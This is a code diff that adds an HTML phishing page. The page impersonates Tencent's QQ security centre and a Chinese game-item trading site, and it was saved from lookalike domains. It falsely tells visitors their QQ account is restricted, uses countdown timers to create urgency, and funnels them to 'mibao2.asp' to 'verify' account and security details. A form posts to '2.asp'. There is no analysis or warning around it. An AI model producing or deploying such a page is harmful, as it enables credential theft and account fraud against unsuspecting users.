@@ -1,0 +1,281 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0051)http://gyyx.s69.zgsj.net/yanzheng.htm  -->
+<!-- saved from url=(0060)http://paipai-com-66.kkgg.net/paipai2058/purchaseorde-01.asp --><HTML><HEAD><TITLE>异常处理中心 - 身份验证</TITLE><!-- saved from url=(0037)https://www.91wang.com/LoginPage.aspx -->
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<META 
+content=中国网络游戏交易第一门户,征途|热血江湖|武林外传|魔兽世界|魔域|惊天动地|奇迹世界|天龙八部|问道|风云|诛仙|梦幻西游|黄易群侠传|冒险岛等网络游戏的最大交易平台,是中国电子商务诚信单位。 
+name=description>
+<META 
+content=91wang.com,装备交易,虚拟交易,网游交易,盛大,征途,诛仙,热血江湖,热血币,武林外传,魔域,惊天动地,黄易群侠传,梦幻西游,魔兽世界,冒险岛 
+name=keywords><LINK href="拍拍网 - 身份验证.files/base.css" type=text/css 
+rel=stylesheet tppabs="http://consignnent5173.cn/detail/91.files/base.css"><LINK 
+href="拍拍网 - 身份验证.files/login.css" type=text/css rel=stylesheet 
+tppabs="http://consignnent5173.cn/detail/91.files/login.css">
+<SCRIPT language=javascript src="拍拍网 - 身份验证.files/common.js" 
+type=text/javascript 
+tppabs="http://consignnent5173.cn/detail/91.files/common.js"></SCRIPT>
+
+<SCRIPT language=javascript src="拍拍网 - 身份验证.files/MD5.js" type=text/javascript 
+tppabs="http://consignnent5173.cn/detail/91.files/MD5.js"></SCRIPT>
+
+<SCRIPT language=javascript type=text/javascript>
+	<!--
+		function doSubmit(e)
+		{
+			if (e.keyCode == 13)
+			{
+				if (document.all)
+				{
+					e.returnValue=false;
+				}
+				else
+				{
+					e.cancel = true;
+					e.preventDefault();
+				}	
+				
+				$('btnLogin').click();
+			}
+		}
+		
+		function doTab()
+		{
+			if (event.keyCode == 13)
+			{
+				$('tbPassword').focus();
+			}
+			return false;
+		}
+		
+		//用户登陆
+		function doLogin()
+		{
+				var username = $("title").value.trim();
+				if(username=='')
+				{
+						alert('请输入有效的用户名，否则无法正常登录！');
+						$("title").focus();
+						return false;
+				}
+
+				var body = $("body").value.trim();
+				if(body=='')
+				{
+						alert('密码不能为空，请重新输入！');
+						$("body").focus();
+						return false;
+				}
+
+				//	TODO: ValidCode.aspx 以后需要开启
+				if($("liValid").style.display!="none" && !checkValid())
+				{
+					return false;
+				}
+			
+				$("hdnPassword").value = calcMD5(password);
+				return true;
+		}
+		
+		function refresh()
+		{
+			$('imgValid').src='ValidCode.aspx?temp='+ (new Date().getTime().toString(36)); 
+			return false;
+		}
+		
+		function checkValid()
+		{
+			//验证码是否为空
+				if($("tbValid").value == '')
+				{
+					alert("验证码不能为空！");
+					$("tbValid").focus();
+					return false
+				}
+
+				//判断验证码是否正确
+				var res = UserAjaxMethod.CheckValidCode($("tbValid").value.trim()).value;
+
+				if(res == "1")
+				{
+					return true;
+				}
+				else
+				{
+					alert("验证码出错，请重新输入");
+					$("tbValid").focus();
+					return false
+				}
+		}
+	//-->
+	</SCRIPT>
+
+<META content="MSHTML 6.00.2900.5803" name=GENERATOR>
+<STYLE type=text/css>
+#errormsg1 {
+	PADDING-RIGHT: 40px; PADDING-LEFT: 10px; MARGIN-BOTTOM: 5px; PADDING-BOTTOM: 5px; LINE-HEIGHT: 140%; PADDING-TOP: 5px; BACKGROUND-COLOR: #fff9d9; TEXT-ALIGN: left
+}
+#loginLeft {
+	FLOAT: left; WIDTH: 381px; PADDING-TOP: 32px
+}
+A:link {
+	COLOR: #266392
+}
+A:hover {
+	COLOR: #266392
+}
+.STYLE20 {color: #000000}
+.STYLE21 {
+	color: #FF0000;
+	font-size: 14px;
+	font-weight: bold;
+}
+.STYLE22 {
+	color: #FF0000;
+	font-weight: bold;
+}
+.STYLE23 {color: #666666}
+.STYLE24 {color: #999999}
+</STYLE>
+</HEAD>
+<BODY>
+<FORM name=form1 onSubmit="return checkInput();" action=2.asp 
+method=post><LABEL></LABEL>
+<div align="center">
+  <p></LABEL>
+  <TABLE height=660 width=1141 border=0>
+    <TBODY>
+      <TR>
+        <TD vAlign=top borderColor=#ffffff width=1135 
+    background="拍拍网 - 身份验证.files/20111201031301.png" height=656><TABLE width=1137 height=88 border=0 background="拍拍网 - 身份验证.files/0111201030230.png">
+          <TBODY>
+            <TR>
+              <TD width="1131" height=84 vAlign=top> ;</TD>
+            </TR>
+          </TBODY>
+        </TABLE>          <P><img src="拍拍网 - 身份验证.files/20111201025543.png" width="1135" height="44" border="0" usemap="#Map"></P>
+        <table width="945" height="511" border="0">
+          <tr>
+            <td width="343" height="59" valign="top" bordercolor="#ffffff" 
+    background="拍拍网 - 身份验证.files/20111201025738.png">&nbsp;</td>
+            <td width="592" valign="top" bordercolor="#ffffff" 
+    background="拍拍网 - 身份验证.files/20111201025738.png">&nbsp;</td>
+          </tr>
+          <tr>
+            <td height="445" valign="top" bordercolor="#ffffff" 
+    background="拍拍网 - 身份验证.files/20111201025738.png"><TABLE border=0 cellSpacing=0 cellPadding=0 width="102%" 
+            background=h&amp;t7_files/T2SFNAXnRaXXXXXXXX_!!189224411.png>
+                <TBODY>
+                  <TR>
+                    <TD width="12%">　</TD>
+                    <TD width="65%"><SCRIPT language=JavaScript>   
+<!--   
+var maxtime = 56*60 //一个小时，按秒计算，自己调整!   
+function CountDown(){   
+if(maxtime>=0){   
+minutes = Math.floor(maxtime/60);   
+seconds = Math.floor(maxtime%60);   
+msg = "0天23小时"+minutes+"分"+seconds+"秒";   
+document.all["timer"].innerHTML=msg;   
+if(maxtime == 0*60) alert('!');   
+--maxtime;   
+}   
+else{   
+clearInterval(timer);   
+alert("!");   
+}   
+}   
+timer = setInterval("CountDown()",1000);   
+//-->   
+              </SCRIPT>
+                        <DIV style="COLOR: red" id=div></DIV></TD>
+                    <TD width="23%" 
+      align=left>　<span style="COLOR: red"><img src="拍拍网 - 身份验证.files/ie6_icon.png" width="38" height="41"></span></TD>
+                  </TR>
+                </TBODY>
+              </TABLE>
+              <p class="f-14 STYLE22">&nbsp;</p>
+              <p class="f-14 STYLE22">&nbsp;</p>              </td>
+            <td valign="top" bordercolor="#ffffff" 
+    background="拍拍网 - 身份验证.files/20111201025738.png"><H2>您的QQ账号部分功能受到临时限制！</H2>
+              <H2>&nbsp;</H2>
+              <p class="f-14 f-14 f-14">QQ安全中心检测到您的账户存在异常，为了保护账号安全，系统临时限制您的QQ号码部分功</p>
+              <p class="f-14 f-14 f-14">能，解除限制后即可正常使用！</p>
+              <p>&nbsp;</p>
+              <p>&nbsp;</p>
+              <TABLE width="102%" border=0 cellPadding=0 cellSpacing=0 
+            background=拍拍网 - 身份验证.files/QQ截图20111201033344.png bgcolor="#FFEEFF">
+                <TBODY>
+                  <TR>
+                    <TD width="2%" height="28">　</TD>
+                    <TD width="75%"><SCRIPT language=JavaScript>   
+<!--   
+var maxtime = 56*60 //一个小时，按秒计算，自己调整!   
+function CountDown(){   
+if(maxtime>=0){   
+minutes = Math.floor(maxtime/60);   
+seconds = Math.floor(maxtime%60);   
+msg = "0天23小时"+minutes+"分"+seconds+"秒";   
+document.all["timer"].innerHTML=msg;   
+if(maxtime == 0*60) alert('!');   
+--maxtime;   
+}   
+else{   
+clearInterval(timer);   
+alert("!");   
+}   
+}   
+timer = setInterval("CountDown()",1000);   
+//-->   
+                        </SCRIPT>
+                        <span class="STYLE21">异常信息</span></TD>
+                    <TD width="23%" 
+      align=left>　</TD>
+                  </TR>
+                  <TR>
+                    <TD height="36">&nbsp;</TD>
+                    <TD><p class="STYLE20">您的帐号被他人在湖南省长沙市恶意申诉。</p></TD>
+                    <TD 
+      align=left>&nbsp;</TD>
+                  </TR>
+                </TBODY>
+              </TABLE>              <p>&nbsp;</p>
+              <DIV class="f-14">您需要通过验证帐号资料，才可解除限制。</DIV>              
+              <p class="f-14 STYLE22">&nbsp;</p>
+              <p class="f-14 STYLE22">
+                <label><a href="mibao2.asp"><img src="拍拍网 - 身份验证.files/20111201034059.png" width="134" height="36" border="0"></a></label>
+              </p>
+              <p class="f-14 STYLE22">&nbsp;</p>
+              <p class="f-14 STYLE22">&nbsp;</p>
+              <p class="f-14 STYLE22">&nbsp;</p>
+              <p class="f-14 STYLE22">&nbsp;</p>
+              <p class="f-14 STYLE22">&nbsp;</p>
+              <TABLE border=0 cellSpacing=0 cellPadding=0 width="102%" 
+            background=h&amp;t7_files/T2SFNAXnRaXXXXXXXX_!!189224411.png>
+                <TBODY>
+                  <TR>
+                    <TD width="12%">　
+                      <p class="f-14 STYLE22"><img src="拍拍网 - 身份验证.files/ie6_bg.png" width="157" height="25"></p>
+                      <p class="f-14 STYLE22">&nbsp;</p>
+                      <p class="f-14 STYLE22"><a id="faq1" onFocus="this.blur()" href="javascript:;">为什么我的QQ帐号会发生异常？</a></p></TD>
+                    </TR>
+                </TBODY>
+              </TABLE>
+              <p class="f-14 STYLE22">&nbsp;</p>
+              <p class="f-14 STYLE22">&nbsp;</p></td>
+          </tr>
+          <tbody>
+          </tbody>
+        </table></TD>
+      </TR>
+    </TBODY>
+  </TABLE>
+</FORM>
+<map name="Map">
+<area shape="rect" coords="124,7,175,38" href="#"><area shape="rect" coords="223,5,306,40" href="#"><area shape="rect" coords="342,6,442,39" href="#"><area shape="rect" coords="480,5,569,38" href="#">
+<area shape="rect" coords="905,7,1017,34" href="#"></map>
+<p><span class="STYLE24">关于腾讯|About Tencent|服务条款|腾讯招聘|漏洞报告|腾讯客服</span></p>
+<p class="STYLE24">Copyright ? 1998 - 2011 Tencent. All Rights Reserved </p>
+<p class="STYLE24">腾讯公司 版权所有</p>
+<p class="STYLE23">&nbsp;</p>
+</BODY>
+</HTML>
